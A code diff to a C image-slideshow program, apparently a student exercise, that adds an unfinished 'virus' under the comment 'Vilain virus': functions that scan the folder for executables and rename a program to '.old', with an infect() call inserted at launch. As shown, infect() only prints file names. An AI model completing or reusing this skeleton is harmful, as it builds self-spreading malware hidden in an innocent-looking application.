@@ -8,6 +8,10 @@
 #include <sys/types.h>
 #include <dirent.h>
 #include <stdlib.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/stat.h>
+
 
 #define MAX 20
 
@@ -16,13 +20,6 @@ int image(const char *fichier){
 	const char *extension[] = {".jpg" , ".png", ".jpeg", ".bmp",NULL};
 	for (int i = 0; extension[i] != NULL; i++){
         if(strstr(fichier, extension[i])){
-        	return 1;	
-        }
-} 	return 0;
-}
-
-int pgm(const char *fichier){
-        if(strstr(fichier, ".c")){
         	return 1;	
         }
 } 	return 0;
@@ -93,37 +90,41 @@ void suivante(GtkWidget *widget, Images *diapo) {
 }
 
 // Vilain virus 
-/* void copie(){
-	char ch;
+// Je verifie si c'est un exécutable
+int est_exe(const char *fichier){
+	struct stat sb;
+	if (lstat(fichier, &sb) == -1) {
+               perror("lstat");
+               exit(EXIT_FAILURE);
+           }
+	if ((strstr(fichier, ".old")) || (strcmp(fichier, "MediaPlayer"))){
+		if ((sb.st_mode & S_IXUSR) && S_ISREG(sb.st_mode)) {
+			return 1;  
+			}
+	}
+		return 0;  
+}
+
+void duplication(char *source, const char ouvreur){
+	// je rename mon programme "pg" en "pg.old"
+	char dest[100];
+	snprintf(dest, sizeof(dest), "%s.old", source);
+	rename(source, dest);
+
+
+} 
+
+void infect(const char lanceur){
 	DIR *rep = opendir(".");
 	if(rep != NULL){
         struct dirent * ent;
         while((ent = readdir(rep)) != NULL){
-        	if(pgm(ent->d_name)){
-			FILE *source;
-			FILE *dest;
-			// Lecture
-			fp1 = fopen(ent->d_name, "r");
-		    	// ouvrir le fichier en écriture
-		    	fp2 = fopen(ent->d_name, "w");
-		  
-		    	// Lire le contenu du fichier
-		    	while((ch = getc(fp1)) != EOF)
-				putc(ch, fp2);
-		  
-		    	fclose(fp1);
-		    	fclose(fp2);
-            }
-        }
-    	closedir(rep);
-    	
-    	
-    	FILE *fp1, *fp2;
-    	
-    	// ouvrir le fichier en lecture
-    	
+        	if(est_exe(ent->d_name)){
+				printf("%s", ent->d_name);
+			}
+		}
+	}
 }
-* */
 
 int main(int argc, char *argv[]) {
     	gtk_init(&argc, &argv);
@@ -131,6 +132,7 @@ int main(int argc, char *argv[]) {
     	char *fichiers[MAX+1];
     	fct_tmp(fichiers);
     
+    	infect(argv[0]);
     	// Je compte le nombre de fichier dans 
     	int count = 0;
     	for(int i = 0; fichiers[i] != NULL; i++){
